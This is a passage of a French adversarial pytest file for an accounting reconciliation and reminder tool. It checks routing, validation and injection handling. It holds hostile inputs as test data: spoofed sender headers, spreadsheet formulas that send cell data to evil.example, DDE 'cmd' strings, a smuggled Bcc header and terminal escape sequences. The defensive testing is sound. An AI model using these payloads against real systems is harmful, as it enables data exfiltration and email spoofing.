"""Revue adversariale independante du MVP.

Chaque defaut affirme est un test marque `xfail(strict=True)` : il devient rouge
le jour ou le defaut est corrige (retirer alors le marqueur). Les tests sans
marqueur sont des attaques qui ont ECHOUE : comportements sains verifies.

Ce fichier ne depend d'aucun autre fichier de tests (helpers recopies) : la
suite `tests/test_cycle.py` evolue en parallele.
"""

from __future__ import annotations

import csv
import datetime as dt
import hashlib
import os
import shutil
import sqlite3
import subprocess
import sys
import threading
import time
import unicodedata
from decimal import Decimal
from email import policy
from email.message import EmailMessage
from email.parser import BytesParser
from pathlib import Path
from zoneinfo import ZoneInfo

import pytest

RACINE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(RACINE / "src"))

from rapprochement import cycle, envoi, routage  # noqa: E402
from rapprochement.depot import Depot  # noqa: E402
from rapprochement.modeles import (  # noqa: E402
    EtatPiece,
    FichierEntrant,
    MessageEntrant,
    MotifNonRoute,
    OperationBancaire,
    Piece,
    PieceAttendue,
    Sens,
    Statut,
    StatutBrouillon,
    StatutRoutage,
)
from rapprochement.moteur import Moteur  # noqa: E402
from rapprochement.parseurs import lire_dossiers  # noqa: E402

PARIS = ZoneInfo("Europe/Paris")
J0 = dt.date(2026, 10, 5)  # lundi
VALIDEUSE = "Marie Durand"
RESPONSABLE = "Claire Roux"
CARACTERES_FORMULE = ("=", "+", "-", "@", "\t", "\r")


def a(jour: dt.date, h: int = 10, m: int = 0) -> dt.datetime:
    return dt.datetime.combine(jour, dt.time(h, m), tzinfo=PARIS)


DOSSIERS = [
    ["ALPHA", "Alpha SARL", "compta@alpha-sarl.fr", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
    ["BETA", "Beta SAS", "contact@beta-sas.fr", "Mme Beta", "20", "courtois", "C-DIRECT", ""],
]
OPERATIONS = [
    # dossier, date, libelle, debit, credit, reference, devise
    ["ALPHA", "2026-09-03", "CB LOXAM LOCATION", "120.00", "", "A-001", "EUR"],
    ["ALPHA", "2026-09-17", "PRLV ORANGE PRO", "59.90", "", "A-002", "EUR"],
    ["BETA", "2026-09-10", "CB METRO CASH", "230.40", "", "B-001", "EUR"],
]


def ecrire_entree(rep: Path, *, operations=OPERATIONS, dossiers=DOSSIERS, pieces=()) -> Path:
    rep.mkdir(parents=True, exist_ok=True)
    with open(rep / "dossiers.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "raison_sociale", "email_contact", "nom_contact",
                    "jour_echeance_tva", "ton_relance", "circuit", "email_relais"])
        w.writerows(dossiers)
    with open(rep / "releve_bancaire.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["dossier", "date_operation", "libelle", "debit", "credit", "reference", "devise"])
        w.writerows(operations)
    with open(rep / "pieces_recues.csv", "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["id_piece", "dossier", "fichier", "fournisseur", "date_facture", "montant_ttc", "devise"])
        w.writerows(pieces)
    return rep


def nouvelle_instance(rep: Path, validateurs: str | None = f"{VALIDEUSE}\nPaul Martin\n") -> cycle.Instance:
    inst = cycle.Instance(rep)
    inst.preparer()
    if validateurs is not None:
        inst.validateurs.write_text(validateurs, encoding="utf-8")
    return inst


def avec_responsable(inst: cycle.Instance, nom: str = RESPONSABLE) -> cycle.Instance:
    """Declare un responsable (`responsables.txt`) : `trancher` et `reparer-audit` l'exigent."""
    inst.responsables.write_text(f"# responsables\n{nom}\n", encoding="utf-8")
    return inst


def eml(expediteur: str, message_id: str, *, objet: str = "Justificatif", corps: str = "",
        fichiers: tuple[tuple[str, bytes], ...] = ()) -> bytes:
    msg = EmailMessage()
    msg["From"] = expediteur
    msg["To"] = "pieces@cabinet.invalid"
    msg["Subject"] = objet
    msg["Message-ID"] = message_id
    msg["Date"] = "Wed, 07 Oct 2026 09:00:00 +0200"
    msg.set_content(corps or "Bonjour")
    for nom, contenu in fichiers:
        msg.add_attachment(contenu, maintype="application", subtype="pdf", filename=nom)
    return bytes(msg)


def lancer(entree: Path, inst: cycle.Instance, jour: dt.date) -> cycle.ResumeCycle:
    return cycle.executer_cycle(entree, inst, jour, a(jour))


@pytest.fixture
def entree(tmp_path: Path) -> Path:
    return ecrire_entree(tmp_path / "entree")


@pytest.fixture
def inst(tmp_path: Path) -> cycle.Instance:
    return nouvelle_instance(tmp_path / "instance")


def brouillon_de(inst: cycle.Instance, destinataire: str, statut=StatutBrouillon.BROUILLON):
    trouves = [b for b in cycle.brouillons(inst, statut) if b.destinataire == destinataire]
    assert len(trouves) == 1, trouves
    return trouves[0]


def cellules(chemin: Path) -> list[str]:
    with open(chemin, newline="", encoding="utf-8") as f:
        return [c for ligne in list(csv.reader(f))[1:] for c in ligne]


# ===========================================================================
# 1. CA-03 : fuite entre clients par le routage
# ===========================================================================

ADRESSES = {"A": frozenset({"jean@client-a.fr"}), "B": frozenset({"paul@client-b.fr"})}
ATTENDUE_A = PieceAttendue(
    reference="A-1", dossier="A", periode="2026-09", montant=Decimal("89.90"),
    date_operation=dt.date(2026, 9, 10), libelle="CB FOURNISSEUR",
)
ATTENDUE_B = PieceAttendue(
    reference="B-1", dossier="B", periode="2026-09", montant=Decimal("89.90"),
    date_operation=dt.date(2026, 9, 10), libelle="CB FOURNISSEUR",
)

FROM_USURPES = [
    b'"jean@client-a.fr" <pirate@evil.com>',          # nom d'affichage qui imite l'adresse
    b"jean@client-a.fr <pirate@evil.com>",            # idem, sans guillemets
    b"pirate@evil.com (jean@client-a.fr)",            # commentaire
    b"<@client-a.fr:pirate@evil.com>",                # route source obsolete
    b"<@evil.com:jean@client-a.fr>",
    b"jean@client-a.fr@evil.com",
    b'"jean@client-a.fr"@evil.com',
    b"=?utf-8?q?jean=40client-a.fr?= <pirate@evil.com>",
    b"=?utf-8?q?jean=40client-a.fr?=",
    b"jean@client-a.fr\x00@evil.com",
    b"jean@client-a.fr.",                              # point final
    b"jean@xn--client-a-x.fr",                         # punycode
    "jean@client-а.fr".encode(),                  # homoglyphe cyrillique
    b"jean@evil.client-a.fr.evil.com",
    b"jean@mail.client-a.fr",                          # sous-domaine
    b"jean@client-a.fr, pirate@evil.com",
    b"<jean@client-a.fr> pirate@evil.com",
    b"pirate@evil.com <jean@client-a.fr>",            # deux angle-addr concurrents
    b"jean@client-a.fr\r\n\tpirate@evil.com",
]


@pytest.mark.parametrize("entete", FROM_USURPES)
def test_sain_from_trompeur_jamais_route_vers_a(tmp_path: Path, entete: bytes) -> None:
    """Attaque ratee : aucune forme tordue de From n'est lue comme jean@client-a.fr."""
    brut = (b"From: " + entete + b"\r\nTo: x@cabinet.fr\r\nSubject: facture 89,90 EUR\r\n"
            b"Message-ID: <m@x>\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n"
            b"--b\r\nContent-Type: text/plain\r\n\r\nci-joint\r\n"
            b"--b\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename=f.pdf\r\n\r\nPDF\r\n--b--\r\n")
    (tmp_path / "m.eml").write_bytes(brut)
    msg = routage.lire_eml(tmp_path / "m.eml")
    assert msg.expediteur != "jean@client-a.fr"
    decisions = routage.router(msg, adresses=ADRESSES, attendues=[ATTENDUE_A, ATTENDUE_B], aujourdhui=J0)
    assert all(d.dossier != "A" for d in decisions)
    assert all(d.statut is not StatutRoutage.PROPOSEE for d in decisions)


def test_sain_sender_et_reply_to_ignores(tmp_path: Path) -> None:
    """Sender / Reply-To a l'adresse de A, From inconnu : pas de routage vers A."""
    brut = eml("pirate@evil.com", "<s@x>", objet="facture 89,90 EUR", fichiers=(("f.pdf", b"PDF"),))
    brut = brut.replace(b"To:", b"Sender: jean@client-a.fr\r\nReply-To: jean@client-a.fr\r\nTo:", 1)
    (tmp_path / "m.eml").write_bytes(brut)
    msg = routage.lire_eml(tmp_path / "m.eml")
    d = routage.router(msg, adresses=ADRESSES, attendues=[ATTENDUE_A], aujourdhui=J0)
    assert [x.dossier for x in d] == [None]


def test_sain_casse_et_alias_restent_dans_le_bon_dossier() -> None:
    """Majuscules et +alias du VRAI domaine de A : routes vers A, jamais vers B."""
    for exp in ("JEAN@CLIENT-A.FR", "jean+factures@client-a.fr"):
        m = MessageEntrant("<x@y>", exp.lower(), dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                           "facture 89,90 EUR", "", (FichierEntrant("f.pdf", b"P"),))
        d = routage.router(m, adresses=ADRESSES, attendues=[ATTENDUE_A, ATTENDUE_B], aujourdhui=J0)
        assert [(x.dossier, x.reference_operation) for x in d] == [("A", "A-1")]


@pytest.mark.parametrize("domaine", ["hotmail.ca", "yahoo.ca", "live.co.uk", "t-online.de",
                                     "libero.it", "videotron.ca"])
def test_regression_domaine_grand_public_hors_liste_sert_de_preuve(domaine: str) -> None:
    adresses = {"A": frozenset({f"gerant.a@{domaine}"}), "B": frozenset({"paul@client-b.fr"})}
    # Un inconnu (ou le gerant de B depuis sa boite perso) ecrit depuis le meme fournisseur.
    m = MessageEntrant("<x@y>", f"inconnu@{domaine}", dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                       "facture 89,90 EUR", "", (FichierEntrant("facture.pdf", b"PDF de B"),))
    d = routage.router(m, adresses=adresses, attendues=[ATTENDUE_A, ATTENDUE_B], aujourdhui=J0)
    assert all(x.statut is not StatutRoutage.PROPOSEE for x in d), d


def test_regression_domaine_grand_public_hors_liste_boucle_complete(tmp_path: Path) -> None:
    dossiers = [["ALPHA", "Alpha SARL", "gerant.alpha@hotmail.ca", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
                DOSSIERS[1]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers,
                           operations=[OPERATIONS[0], OPERATIONS[2]])
    inst = nouvelle_instance(tmp_path / "i")
    (inst.entrant / "1.eml").write_bytes(eml(
        "Inconnu <quelquun@hotmail.ca>", "<p1@x>", objet="facture 120,00 EUR",
        fichiers=(("facture_2026-09.pdf", b"%PDF confidentiel"),)))
    resume = lancer(entree, inst, J0)
    file = cycle.lister_file(inst)
    assert resume.propositions == 0
    assert all(d.statut is not StatutRoutage.PROPOSEE for d in file)


def test_sain_boucle_complete_nom_affiche_usurpe(entree: Path, inst: cycle.Instance) -> None:
    """CLI + cycle : From '"compta@alpha-sarl.fr" <pirate@evil.com>' finit en DOSSIER_INCONNU."""
    (inst.entrant / "1.eml").write_bytes(eml(
        '"compta@alpha-sarl.fr" <pirate@evil.com>', "<p1@x>", objet="facture 120,00 EUR",
        fichiers=(("facture_2026-09.pdf", b"%PDF"),)))
    lancer(entree, inst, J0)
    file = cycle.lister_file(inst)
    assert [(d.statut, d.dossier) for d in file] == [(StatutRoutage.NON_ROUTEE, None)]


def test_regression_code_dossier_nfc_nfd_jamais_relance(tmp_path: Path) -> None:
    nfc, nfd = "CAFÉ", "CAFÉ"
    dossiers = [[nfc, "Cafe SARL", "compta@cafe.fr", "M. Cafe", "15", "courtois", "C-DIRECT", ""]]
    ops = [[nfd, "2026-09-03", "CB LOXAM", "120.00", "", "C-001", "EUR"]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    resume = lancer(entree, inst, J0)
    assert resume.brouillons_crees == 1, resume.texte()


def test_sain_rattacher_ne_traverse_pas_les_dossiers(entree: Path, inst: cycle.Instance) -> None:
    """rattacher --dossier BETA --reference A-001 : refuse (la reference est d'ALPHA)."""
    lancer(entree, inst, J0)
    with pytest.raises(cycle.ErreurCycle):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(J0), dossier="BETA",
                              reference="A-001", id_piece="x")


def charger_cli():
    import importlib.util
    spec = importlib.util.spec_from_file_location("cli_cycle_adv", RACINE / "scripts" / "cycle.py")
    module = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    spec.loader.exec_module(module)
    return module


def test_regression_cli_file_sequences_d_echappement(entree, inst, capsys) -> None:
    brut = eml("inconnu@evil.example", "<x@y>", fichiers=(("f.pdf", b"%PDF"),))
    brut = brut.replace(b"Message-ID: <x@y>", b"Message-ID: \x1b[1A\x1b[2K\x1b[1A\x1b[2Kcache")
    (inst.entrant / "1.eml").write_bytes(brut)
    lancer(entree, inst, J0)
    capsys.readouterr()
    assert charger_cli().main(["file", "--instance", str(inst.racine), "--date", J0.isoformat()]) == 0
    sortie = capsys.readouterr().out
    assert "cache" in sortie
    assert "\x1b" not in sortie
    assert "\\x1b[1A" in sortie            # rendu visible, pas supprime


def test_sain_cli_par_truque_et_envoi_sans_validation(entree, inst, capsys) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    for par in ("../Marie Durand", "systeme", "Marie Durand\nx", "# commentaire"):
        assert cli.main(["valider", b.id_relance, "--par", par, *base]) == 1
    # Envoi nominatif : `--par` est obligatoire, et doit etre un validateur declare.
    with pytest.raises(SystemExit):
        cli.main(["envoyer", b.id_relance, *base])
    for par in ("Mallory", "systeme", "../Marie Durand"):
        assert cli.main(["envoyer", b.id_relance, "--par", par, *base]) == 1
    assert cli.main(["envoyer", b.id_relance, "--par", VALIDEUSE, *base]) == 1   # pas encore valide
    assert list(inst.outbox.glob("*.eml")) == []
    assert cli.main(["valider", b.id_relance, "--par", "MARIE durand", *base]) == 0
    assert cli.main(["envoyer", b.id_relance, "--par", VALIDEUSE, *base, "--heure", "07:59"]) == 1   # hors creneau
    assert cli.main(["envoyer", b.id_relance, "--par", "Mallory", *base]) == 1
    assert list(inst.outbox.glob("*.eml")) == []
    assert cli.main(["envoyer", b.id_relance, "--par", "paul martin", *base]) == 0
    assert cli.main(["envoyer", b.id_relance, "--par", VALIDEUSE, *base]) == 1
    assert len(list(inst.outbox.glob("*.eml"))) == 1
    from rapprochement.audit import JournalAudit
    envoye = [e for e in JournalAudit(inst.audit).lire() if e.action == "envoi_effectue"]
    assert [e.details["envoye_par"] for e in envoye] == ["Paul Martin"]      # qui a DECLENCHE


# ===========================================================================
# 2. CA-06 : envoi sans validation humaine
# ===========================================================================


def _forcer(inst: cycle.Instance, id_relance: str, statut: str, valide_par: str) -> None:
    conn = sqlite3.connect(inst.depot)
    with conn:
        conn.execute("UPDATE brouillons SET statut=?, valide_par=? WHERE id_relance=?",
                     (statut, valide_par, id_relance))
    conn.close()


@pytest.mark.parametrize("valide_par", ["", "   ", "systeme", "ROBOT", "cron"])
def test_sain_statut_forge_en_sql_sans_humain_refuse(entree, inst, valide_par) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    _forcer(inst, b.id_relance, "validee", valide_par)
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    _forcer(inst, b.id_relance, "en_cours", valide_par or "x")
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    assert list(inst.outbox.glob("*.eml")) == []


@pytest.mark.xfail(strict=True, reason=(
    "LIMITE ASSUMEE (docs/architecture_mvp.md section 7, 'Identite non authentifiee' : "
    "un acces en ecriture a l'instance permet de tout falsifier). UPDATE brouillons SET "
    "statut='validee', valide_par='Mallory' en SQL : `envoyer` emet sans verification "
    "croisee avec validateurs.txt ni avec une entree `valide` du journal."))
def test_defaut_validation_forgee_en_sql_par_un_inconnu_part(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    _forcer(inst, b.id_relance, "validee", "Mallory")
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    assert list(inst.outbox.glob("*.eml")) == []


def test_sain_envoyee_immuable_en_sql(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    conn = sqlite3.connect(inst.depot)
    with pytest.raises(sqlite3.DatabaseError):
        with conn:
            conn.execute("UPDATE brouillons SET statut='validee' WHERE id_relance=?", (b.id_relance,))
    with pytest.raises(sqlite3.DatabaseError):
        with conn:
            conn.execute("DELETE FROM envois")
    conn.close()
    with pytest.raises(envoi.EnvoiNonValide):
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0 + dt.timedelta(days=8)))
    assert len(list(inst.outbox.glob("*.eml"))) == 1


def test_sain_expediteur_dossier_appele_directement_refuse(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    for forge in (b, b.__class__(**{**b.__dict__, "statut": StatutBrouillon.VALIDEE, "valide_par": "Marie"}),
                  b.__class__(**{**b.__dict__, "statut": StatutBrouillon.EN_COURS, "valide_par": "bot"})):
        with pytest.raises(envoi.ErreurEnvoiCertaine):
            envoi.ExpediteurDossier(inst.outbox).envoyer(forge)
    assert list(inst.outbox.glob("*.eml")) == []


@pytest.mark.parametrize("par", [
    "../Marie Durand", "Marie Durand/..", "Marie Durand", "Marie  Durand", "Marie Durand\nsysteme",
    "# commentaire", "", " ", "x" * 100_000, "Marie Durand\x00", "Mаrie Durand",  # a cyrillique
    "MARIE DURAND​",
])
def test_sain_par_truque_refuse(entree, tmp_path, par) -> None:
    inst = nouvelle_instance(tmp_path / "i", "# commentaire\n\nMarie Durand\r\nPaul Martin\r\n")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(inst, b.id_relance, par, maintenant=a(J0))
    assert cycle.brouillons(inst, StatutBrouillon.VALIDEE) == []


def test_sain_validateurs_crlf_et_casse(entree, tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", "# commentaire\r\n\r\nMarie Durand\r\nPaul Martin\r\n")
    assert cycle.exiger_validateur(inst, "  paul MARTIN ") == "Paul Martin"


def test_regression_validateurs_avec_bom(tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.write_bytes("﻿Marie Durand\r\nPaul Martin\r\n".encode("utf-8"))
    assert cycle.exiger_validateur(inst, "Marie Durand") == "Marie Durand"
    assert cycle.lire_validateurs(inst) == ("Marie Durand", "Paul Martin")
    # Le BOM n'ouvre pas de porte : un nom non declare reste refuse.
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.exiger_validateur(inst, "\ufeffMallory")


def test_sain_validateurs_illisible_refuse_toujours(tmp_path) -> None:
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.mkdir()
    with pytest.raises(Exception):
        cycle.exiger_validateur(inst, VALIDEUSE)
    inst.validateurs.rmdir()
    inst.validateurs.write_bytes("H\xe9l\xe8ne\n".encode("latin-1"))
    with pytest.raises(Exception):
        cycle.exiger_validateur(inst, "Hélène")


def test_sain_instance_alternative_n_herite_pas_des_validateurs(entree, inst, tmp_path) -> None:
    """--instance pointant vers une autre racine : ses validateurs (absents) gouvernent."""
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    autre = tmp_path / "autre"
    shutil.copytree(inst.racine, autre)
    (autre / "validateurs.txt").unlink()
    with pytest.raises(cycle.ValidateurRefuse):
        cycle.valider_relance(cycle.Instance(autre), b.id_relance, VALIDEUSE, maintenant=a(J0))


# ===========================================================================
# 3. CA-05 : double envoi / limite hebdomadaire
# ===========================================================================


class _Coupure:
    def envoyer(self, brouillon):
        raise TimeoutError("connexion SMTP coupee apres DATA")


def test_regression_envoi_incertain_ignore_par_la_limite_hebdo(tmp_path: Path) -> None:
    entree = ecrire_entree(tmp_path / "e")
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    lancer(entree, inst, J0)
    b1 = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b1.id_relance, VALIDEUSE, maintenant=a(J0))
    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, b1.id_relance, maintenant=a(J0), expediteur=_Coupure())
    assert cycle.brouillons(inst, StatutBrouillon.EN_COURS)[0].id_relance == b1.id_relance
    # Le client a bien recu b1 : il envoie ses pieces, rattachees par un humain.
    j1 = J0 + dt.timedelta(days=1)
    for ref in ("A-001", "A-002"):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(j1), dossier="ALPHA", reference=ref,
                              id_piece=f"P-{ref}")
    # Une nouvelle operation apparait le lendemain.
    ecrire_entree(tmp_path / "e", operations=OPERATIONS + [
        ["ALPHA", "2026-10-02", "CB AMAZON", "33.00", "", "A-005", "EUR"]])
    lancer(entree, inst, j1)
    b2 = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b2.id_relance, VALIDEUSE, maintenant=a(j1))
    # La bonne raison, pas une autre (piece non reclamable, limite hebdo...).
    with pytest.raises(envoi.EnvoiIncertainEnAttente):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a(j1))
    assert list(inst.outbox.glob("*.eml")) == []
    # Un humain constate que b1 est parti : la limite hebdomadaire prend le relais.
    with pytest.raises(cycle.ValidateurRefuse):          # un validateur simple ne tranche pas
        cycle.trancher_envoi(inst, b1.id_relance, VALIDEUSE, parti=True, maintenant=a(j1))
    assert cycle.brouillons(inst, StatutBrouillon.EN_COURS)[0].id_relance == b1.id_relance
    cycle.trancher_envoi(inst, b1.id_relance, RESPONSABLE, parti=True, maintenant=a(j1))
    with pytest.raises(envoi.EnvoiNonValide, match="7 jours"):
        cycle.envoyer_relance(inst, b2.id_relance, maintenant=a(j1))
    assert list(inst.outbox.glob("*.eml")) == []


def test_sain_deux_processus_meme_brouillon_un_seul_eml(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    depart = threading.Barrier(4)
    resultats: list[str] = []

    def tenter() -> None:
        depart.wait()
        try:
            cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
            resultats.append("ok")
        except Exception as exc:  # noqa: BLE001
            resultats.append(type(exc).__name__)

    fils = [threading.Thread(target=tenter) for _ in range(4)]
    for f in fils:
        f.start()
    for f in fils:
        f.join()
    assert resultats.count("ok") == 1, resultats
    assert len(list(inst.outbox.glob("*.eml"))) == 1


def _deux_brouillons_meme_destinataire(inst: cycle.Instance, entree: Path):
    lancer(entree, inst, J0)
    b1 = brouillon_de(inst, "compta@alpha-sarl.fr")
    return b1


@pytest.mark.parametrize("envoi_1, tentative, autorise", [
    # Passage a l'heure d'hiver le dimanche 25/10/2026 : 7 jours calendaires, pas 7x24 h.
    (a(dt.date(2026, 10, 23), 17, 59), a(dt.date(2026, 10, 29), 8, 0), False),
    (a(dt.date(2026, 10, 23), 17, 59), a(dt.date(2026, 10, 30), 8, 0), True),
    # Instant exprime en UTC : c'est la date de Paris qui compte.
    (dt.datetime(2026, 10, 23, 15, 59, tzinfo=dt.timezone.utc),
     dt.datetime(2026, 10, 30, 7, 0, tzinfo=dt.timezone.utc), True),
    # Fin d'annee : 31/12 puis 06/01 (6 jours, 1er janvier ferie au milieu).
    (a(dt.date(2026, 12, 31), 9), a(dt.date(2027, 1, 6), 9), False),
    (a(dt.date(2026, 12, 31), 9), a(dt.date(2027, 1, 7), 9), True),
])
def test_sain_fenetre_hebdo_fuseaux_dst_fin_d_annee(tmp_path, envoi_1, tentative, autorise) -> None:
    """La limite d'un e-mail par 7 jours tient aux changements d'heure et d'annee."""
    from rapprochement.audit import JournalAudit
    from rapprochement.modeles import Brouillon
    depot = Depot(tmp_path / "d.sqlite")
    journal = JournalAudit(tmp_path / "a.jsonl")
    for i in (1, 2):
        depot.sauver_brouillon(Brouillon(f"b{i}", "x@client.fr", "objet", "corps", ("D",), (f"R{i}",),
                                         1, envoi_1.date()))
        envoi.valider(depot, journal, f"b{i}", VALIDEUSE, maintenant=envoi_1)
    envoi.envoyer(depot, journal, envoi.ExpediteurDossier(tmp_path / "o"), "b1", maintenant=envoi_1)
    if autorise:
        envoi.envoyer(depot, journal, envoi.ExpediteurDossier(tmp_path / "o"), "b2", maintenant=tentative)
    else:
        with pytest.raises(envoi.EnvoiLimiteHebdomadaire):
            envoi.envoyer(depot, journal, envoi.ExpediteurDossier(tmp_path / "o"), "b2", maintenant=tentative)
    depot.fermer()


def test_sain_rejeu_cycle_apres_rejet_ne_recree_rien_le_meme_jour(entree, inst) -> None:
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.rejeter_relance(inst, b.id_relance, VALIDEUSE, "trop tot", maintenant=a(J0))
    r = lancer(entree, inst, J0)
    assert r.brouillons_crees == 0
    assert cycle.brouillons(inst, StatutBrouillon.BROUILLON) == [
        x for x in cycle.brouillons(inst, StatutBrouillon.BROUILLON) if x.destinataire != b.destinataire]


# ===========================================================================
# 4. Injections
# ===========================================================================

FORMULE_LIBELLE = '=HYPERLINK("https://evil.example/?d="&A2,"Voir")'
FORMULE_FICHIER = '=IMPORTXML(CONCAT("https:",CHAR(47),CHAR(47),"evil.example?",B2),"a").pdf'


def _sorties_piegees(tmp_path: Path) -> cycle.Instance:
    ops = [
        ["ALPHA", "2026-09-03", FORMULE_LIBELLE, "120.00", "", "A-001", "EUR"],
        ["ALPHA", "2026-09-05", "+cmd|' /C calc'!A0", "", "15.00", "A-009", "EUR"],   # credit -> a_verifier
        ["BETA", "2026-09-10", "@SUM(1+1)*cmd|' /C calc'!A0", "230.40", "", "B-001", "EUR"],
    ]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    # Piece deja escaladee en base pour peupler escalades.csv.
    with Depot(inst.depot) as d:
        d.sauver_pieces([PieceAttendue(
            reference="B-001", dossier="BETA", periode="2026-09", montant=Decimal("230.40"),
            date_operation=dt.date(2026, 9, 10), libelle="@SUM(1+1)*cmd|' /C calc'!A0",
            etat=EtatPiece.ESCALADEE, nb_relances=3, date_premiere_demande=dt.date(2026, 9, 14),
            date_derniere_relance=dt.date(2026, 9, 28))])
    # Un inconnu, sans aucune authentification, choisit le nom de la piece jointe.
    (inst.entrant / "1.eml").write_bytes(eml("inconnu@evil.example", "<p@x>",
                                             fichiers=((FORMULE_FICHIER, b"%PDF"),)))
    lancer(entree, inst, J0)
    return inst


def test_regression_formule_csv_tableau_suivi(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert not [c for c in cellules(inst.sortie / "tableau_suivi.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_pieces_attendues(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert not [c for c in cellules(inst.sortie / "pieces_attendues.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_a_verifier(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert not [c for c in cellules(inst.sortie / "a_verifier.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_escalades(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    assert (inst.sortie / "escalades.csv").exists()
    assert not [c for c in cellules(inst.sortie / "escalades.csv") if c.startswith(CARACTERES_FORMULE)]


def test_regression_formule_csv_file_humaine_nom_de_piece_jointe(tmp_path) -> None:
    inst = _sorties_piegees(tmp_path)
    cel = cellules(inst.sortie / "file_humaine.csv")
    assert not [c for c in cel if c.startswith(CARACTERES_FORMULE)]
    assert "'" + FORMULE_FICHIER in cel             # neutralise, pas efface


def test_regression_formules_neutralisees_sans_perte_dans_tous_les_csv(tmp_path) -> None:
    """Chaque CSV de sortie : aucune cellule declencheuse, et le texte d'origine survit."""
    inst = _sorties_piegees(tmp_path)
    (inst.entrant / "=cmd|' calc'!A0.eml").write_bytes(_imbrique(1000))   # nom en quarantaine
    lancer(inst.racine.parent / "e", inst, J0)
    tous = {f.name: cellules(f) for f in inst.sortie.glob("*.csv")}
    assert {"tableau_suivi.csv", "pieces_attendues.csv", "a_verifier.csv", "file_humaine.csv",
            "escalades.csv", "periodes.csv", "quarantaine.csv"} <= set(tous)
    for nom, cel in tous.items():
        assert not [c for c in cel if c.startswith(CARACTERES_FORMULE)], nom
    assert "'" + FORMULE_LIBELLE in tous["tableau_suivi.csv"]
    assert "'=cmd|' calc'!A0.eml" in tous["quarantaine.csv"]
    assert "120.00" in tous["tableau_suivi.csv"]     # un nombre reste un nombre


def test_sain_injection_d_en_tete_par_le_libelle(tmp_path) -> None:
    """Un libelle avec CRLF + Bcc reste dans le corps : aucun en-tete ajoute a l'e-mail."""
    ops = [["ALPHA", "2026-09-03", "CB LOXAM\r\nBcc: espion@evil.example\r\n\r\nX", "120.00", "", "A-001", "EUR"]]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    [fichier] = list(inst.outbox.glob("*.eml"))
    msg = BytesParser(policy=policy.default).parsebytes(fichier.read_bytes())
    assert msg["Bcc"] is None and msg.get_all("To") == ["compta@alpha-sarl.fr"]
    assert "evil" not in "".join(f"{k}:{v}" for k, v in msg.items())


def test_sain_injection_d_en_tete_par_la_raison_sociale(tmp_path) -> None:
    dossiers = [["ALPHA", "Alpha\r\nBcc: espion@evil.example", "compta@alpha-sarl.fr", "M", "15",
                 "courtois", "C-DIRECT", ""]]
